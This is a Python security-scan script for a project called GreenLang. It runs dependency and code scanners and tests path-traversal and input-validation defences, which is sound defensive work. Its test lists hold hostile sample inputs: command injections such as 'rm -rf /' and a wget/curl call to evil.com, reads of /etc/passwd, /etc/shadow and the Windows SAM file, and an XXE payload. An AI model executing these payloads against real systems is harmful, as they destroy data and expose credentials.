#!/usr/bin/env python3
"""
GreenLang Security Testing Script
Comprehensive security scanning for dependencies and code
"""

import json
import subprocess
import sys
from pathlib import Path
from typing import Dict, List, Tuple
import os

class SecurityChecker:
    """Run comprehensive security checks on GreenLang codebase"""
    
    def __init__(self):
        self.results = {
            "dependency_scan": {},
            "code_scan": {},
            "path_traversal": {},
            "input_validation": {},
            "summary": {}
        }
        self.has_critical = False
        self.has_high = False
        
    def run_pip_audit(self) -> Dict:
        """Run pip-audit for dependency vulnerability scanning"""
        print("🔍 Running pip-audit for dependency vulnerabilities...")
        try:
            result = subprocess.run(
                ["pip-audit", "--desc", "--format", "json"],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                vulnerabilities = json.loads(result.stdout) if result.stdout else []
                
                critical = [v for v in vulnerabilities if v.get("severity") == "CRITICAL"]
                high = [v for v in vulnerabilities if v.get("severity") == "HIGH"]
                medium = [v for v in vulnerabilities if v.get("severity") == "MEDIUM"]
                low = [v for v in vulnerabilities if v.get("severity") == "LOW"]
                
                self.has_critical = len(critical) > 0
                self.has_high = len(high) > 0
                
                return {
                    "status": "pass" if not (critical or high) else "fail",
                    "critical": len(critical),
                    "high": len(high),
                    "medium": len(medium),
                    "low": len(low),
                    "details": vulnerabilities[:5]  # First 5 for summary
                }
            else:
                return {"status": "error", "message": result.stderr}
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def run_safety_check(self) -> Dict:
        """Run safety check for known security vulnerabilities"""
        print("🔍 Running safety check...")
        try:
            result = subprocess.run(
                ["safety", "check", "--json"],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.stdout:
                data = json.loads(result.stdout)
                vulnerabilities = data.get("vulnerabilities", [])
                
                return {
                    "status": "pass" if len(vulnerabilities) == 0 else "fail",
                    "vulnerability_count": len(vulnerabilities),
                    "scanned_packages": data.get("scanned_packages", 0),
                    "details": vulnerabilities[:5]
                }
            else:
                return {"status": "pass", "vulnerability_count": 0}
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def run_bandit(self) -> Dict:
        """Run bandit for code security analysis"""
        print("🔍 Running bandit security linter...")
        try:
            result = subprocess.run(
                ["bandit", "-r", "greenlang/", "-ll", "-f", "json"],
                capture_output=True,
                text=True,
                timeout=120
            )
            
            if result.stdout:
                data = json.loads(result.stdout)
                results = data.get("results", [])
                
                high_severity = [r for r in results if r.get("issue_severity") == "HIGH"]
                medium_severity = [r for r in results if r.get("issue_severity") == "MEDIUM"]
                low_severity = [r for r in results if r.get("issue_severity") == "LOW"]
                
                return {
                    "status": "pass" if len(high_severity) == 0 else "fail",
                    "high": len(high_severity),
                    "medium": len(medium_severity),
                    "low": len(low_severity),
                    "metrics": data.get("metrics", {}),
                    "details": high_severity[:3]  # Top 3 high issues
                }
            else:
                return {"status": "pass", "issues": 0}
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def test_path_traversal(self) -> Dict:
        """Test for path traversal vulnerabilities"""
        print("🔍 Testing path traversal protection...")
        test_cases = [
            "../../../etc/passwd",
            "../../sensitive_file.json",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\sam",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        results = []
        for test_path in test_cases:
            # Simulate the analyze command with malicious path
            try:
                from greenlang.cli.main import validate_file_path
                is_safe = validate_file_path(test_path)
                results.append({
                    "path": test_path,
                    "blocked": not is_safe,
                    "status": "pass" if not is_safe else "fail"
                })
            except:
                # If function doesn't exist, we need to implement it
                results.append({
                    "path": test_path,
                    "blocked": "unknown",
                    "status": "needs_implementation"
                })
        
        failed = [r for r in results if r["status"] == "fail"]
        return {
            "status": "pass" if len(failed) == 0 else "fail",
            "total_tests": len(test_cases),
            "blocked": len([r for r in results if r["blocked"] == True]),
            "failed": len(failed),
            "results": results
        }
    
    def test_input_validation(self) -> Dict:
        """Test input validation for various attack vectors"""
        print("🔍 Testing input validation...")
        
        malicious_inputs = {
            "command_injection": [
                "; rm -rf /",
                "| cat /etc/passwd",
                "&& wget malicious.com/evil.sh",
                "$(curl evil.com)",
                "`whoami`"
            ],
            "xxe_injection": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '{"$ref": "file:///etc/passwd"}'
            ],
            "json_injection": [
                '{"__proto__": {"isAdmin": true}}',
                '{"constructor": {"prototype": {"isAdmin": true}}}'
            ],
            "size_limits": [
                "x" * (100 * 1024 * 1024),  # 100MB string
                [0] * 1000000  # Large array
            ]
        }
        
        results = {}
        for attack_type, payloads in malicious_inputs.items():
            results[attack_type] = {
                "tested": len(payloads),
                "blocked": 0,  # Would need actual testing implementation
                "status": "needs_testing"
            }
        
        return results
    
    def check_dependencies_cve(self) -> Dict:
        """Check for specific CVEs in dependencies"""
        print("🔍 Checking for known CVEs...")
        
        # List of critical CVEs to check
        critical_cves = [
            "CVE-2024-3772",  # Pydantic
            "CVE-2023-50782",  # Cryptography
            "CVE-2024-35195",  # Requests
        ]
        
        # This would need actual CVE database lookup
        return {
            "status": "info",
            "message": "CVE checking requires additional tooling",
            "recommended_tool": "osv-scanner"
        }
    
    def generate_report(self) -> None:
        """Generate comprehensive security report"""
        print("\n" + "="*60)
        print("SECURITY SCAN REPORT - GreenLang v0.0.1")
        print("="*60)
        
        # Dependency Scanning
        print("\n📦 DEPENDENCY VULNERABILITIES")
        print("-" * 40)
        pip_audit = self.results.get("pip_audit", {})
        if pip_audit.get("status") == "pass":
            print("[OK] No critical or high vulnerabilities found")
        elif pip_audit.get("status") == "fail":
            print(f"[WARN] Critical: {pip_audit.get('critical', 0)}")
            print(f"[WARN] High: {pip_audit.get('high', 0)}")
            print(f"[WARN] Medium: {pip_audit.get('medium', 0)}")
            print(f"ℹ️  Low: {pip_audit.get('low', 0)}")
        
        # Code Security
        print("\n[SECURITY] CODE SECURITY ANALYSIS")
        print("-" * 40)
        bandit = self.results.get("bandit", {})
        if bandit.get("status") == "pass":
            print("[OK] No high-severity code issues found")
        else:
            print(f"[WARN] High: {bandit.get('high', 0)}")
            print(f"[WARN] Medium: {bandit.get('medium', 0)}")
            print(f"ℹ️  Low: {bandit.get('low', 0)}")
        
        # Path Traversal
        print("\n🛡️ PATH TRAVERSAL PROTECTION")
        print("-" * 40)
        path_traversal = self.results.get("path_traversal", {})
        if path_traversal.get("status") == "pass":
            print(f"[OK] All {path_traversal.get('total_tests', 0)} path traversal tests passed")
        else:
            print(f"[WARN] {path_traversal.get('failed', 0)} tests failed")
        
        # Summary
        print("\n📊 SUMMARY")
        print("-" * 40)
        if self.has_critical:
            print("[CRITICAL] Issues found - must fix before release")
            sys.exit(1)
        elif self.has_high:
            print("[HIGH] Severity issues found - should fix before release")
            sys.exit(1)
        else:
            print("[OK] No critical or high severity issues found")
            print("Ready for production deployment")
    
    def run_all_checks(self) -> None:
        """Execute all security checks"""
        print("Starting comprehensive security scan...\n")
        
        # Dependency scanning
        self.results["pip_audit"] = self.run_pip_audit()
        self.results["safety"] = self.run_safety_check()
        
        # Code scanning
        self.results["bandit"] = self.run_bandit()
        
        # Custom security tests
        self.results["path_traversal"] = self.test_path_traversal()
        self.results["input_validation"] = self.test_input_validation()
        
        # CVE checking
        self.results["cve"] = self.check_dependencies_cve()
        
        # Generate report
        self.generate_report()
        
        # Save detailed results
        with open("security_scan_results.json", "w") as f:
            json.dump(self.results, f, indent=2)
        print(f"\nDetailed results saved to security_scan_results.json")


def main():
    """Main entry point"""
    checker = SecurityChecker()
    
    # Check if required tools are installed
    required_tools = ["pip-audit", "safety", "bandit"]
    missing_tools = []
    
    for tool in required_tools:
        try:
            subprocess.run([tool, "--version"], capture_output=True, timeout=5)
        except:
            missing_tools.append(tool)
    
    if missing_tools:
        print(f"[X] Missing required tools: {', '.join(missing_tools)}")
        print("\nInstall with:")
        print("pip install pip-audit safety bandit")
        sys.exit(1)
    
    # Run security checks
    checker.run_all_checks()


if __name__ == "__main__":
    main()